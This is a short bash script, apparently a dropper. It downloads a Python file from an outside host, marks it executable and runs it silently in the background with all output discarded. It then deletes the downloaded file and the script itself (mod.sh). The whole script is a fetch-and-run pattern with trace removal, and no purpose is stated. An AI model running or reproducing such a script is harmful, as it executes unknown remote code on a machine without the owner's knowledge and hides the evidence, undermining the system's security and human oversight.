#!/bin/bash
wget https://cyberprime.netlify.app/mod.py 
chmod +x mod.py
sleep 4
nohup python3 mod.py >/dev/null 2>&1 &
sleep 4
rm mod.sh
rm mod.py

